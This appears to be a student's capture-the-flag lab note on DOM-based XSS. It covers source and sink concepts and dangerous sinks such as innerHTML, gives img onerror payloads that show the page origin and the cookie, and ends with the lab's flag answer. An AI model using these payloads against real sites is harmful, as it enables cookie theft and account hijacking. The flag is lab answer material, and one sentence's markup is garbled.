
>[! Note] Source & Sink
> Source is the JS object that takes user input. Sink is the function that writes user input to a DOM Object on the page. If Sink doesn't sanitize user input, XSS is inevitable.

#### JavaScript Functions to write to DOM objects:

```go
document.write()
```

```go
DOM.innerHTML
```

```go
DOM.outerHTML
```

### DOM Attacks

XSS <script> attacks will not work against DOM objects because of the innerHTML function</script> 

However, the following will work against DOM objects:
```go
<img src="" onerror=alert(window.origin)>
```

# Questions

### To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.

```go
<img src="" onerror=alert(document.cookie)>
```

Answer:
```go
HTB{pur3ly_cl13n7_51d3}
```